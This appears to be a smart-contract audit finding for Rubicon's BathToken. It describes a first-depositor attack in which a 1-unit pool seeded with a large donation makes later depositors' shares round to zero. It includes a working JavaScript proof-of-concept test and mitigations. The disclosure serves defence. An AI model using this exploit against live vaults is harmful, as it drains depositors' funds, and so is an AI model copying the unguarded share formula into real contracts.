## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [First depositor can break minting of shares](https://github.com/code-423n4/2022-05-rubicon-findings/issues/397) 

# Lines of code

https://github.com/RubiconDeFi/rubicon-protocol-v1/blob/master/contracts/rubiconPools/BathToken.sol#L569-L571


# Vulnerability details

## Impact
The attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719_ToB_yearn_vaultsv2/ToB_-_Yearn_Vault_v_2_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large “donation”.

## Proof of Concept
In `BathToken.sol:569-571`, the allocation of shares is calculated as follows:
```js
(totalSupply == 0) ? shares = assets : shares = (
    assets.mul(totalSupply)
).div(_pool);
```

An early attacker can exploit this by:
* Attacker calls `openBathTokenSpawnAndSignal()` with `initialLiquidityNew = 1`, creating a new bath token with `totalSupply = 1`
* Attacker transfers a large amount of underlying tokens to the bath token contract, such as `1000000`
* Using `deposit()`, a victim deposits an amount less than `1000000`, such as `1000`:
    * `assets = 1000`
    * `(assets * totalSupply) / _pool = (1000 * 1) / 1000000 = 0.001`, which would round down to `0`
    * Thus, the victim receives no shares in return for his deposit

To avoid minting 0 shares, subsequent depositors have to deposit equal to or more than the amount transferred by the attacker. Otherwise, their deposits accrue to the attacker who holds the only share.

```js
it("Victim receives 0 shares", async () => {
    // 1. Attacker deposits 1 testCoin first when creating the liquidity pool
    const initialLiquidityNew = 1;
    const initialLiquidityExistingBathToken = ethers.utils.parseUnits("100", decimals);
    
    // Approve DAI and testCoin for bathHouseInstance
    await testCoin.approve(bathHouseInstance.address, initialLiquidityNew, {
        from: attacker,
    });
    await DAIInstance.approve(
        bathHouseInstance.address,
        initialLiquidityExistingBathToken,
        { from: attacker }
    );

    // Call open creation function, attacker deposits only 1 testCoin
    const desiredPairedAsset = await DAIInstance.address;
    await bathHouseInstance.openBathTokenSpawnAndSignal(
        await testCoin.address,
        initialLiquidityNew,
        desiredPairedAsset,
        initialLiquidityExistingBathToken,
        { from: attacker }
    );
    
    // Retrieve resulting bathToken address
    const newbathTokenAddress = await bathHouseInstance.getBathTokenfromAsset(testCoin.address);
    const _newBathToken = await BathToken.at(newbathTokenAddress);

    // 2. Attacker deposits large amount of testCoin into liquidity pool
    let attackerAmt = ethers.utils.parseUnits("1000000", decimals);
    await testCoin.approve(newbathTokenAddress, attackerAmt, {from: attacker});
    await testCoin.transfer(newbathTokenAddress, attackerAmt, {from: attacker});

    // 3. Victim deposits a smaller amount of testCoin, receives 0 shares
    // In this case, we use (1 million - 1) testCoin
    let victimAmt = ethers.utils.parseUnits("999999", decimals);
    await testCoin.approve(newbathTokenAddress, victimAmt, {from: victim});
    await _newBathToken.deposit(victimAmt, victim, {from: victim});
    
    assert.equal(await _newBathToken.balanceOf(victim), 0);
});
```

## Recommended Mitigation Steps
* [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution.
* In `_deposit()`, ensure the number of shares to be minted is non-zero:  
`require(shares != 0, "No shares minted");`



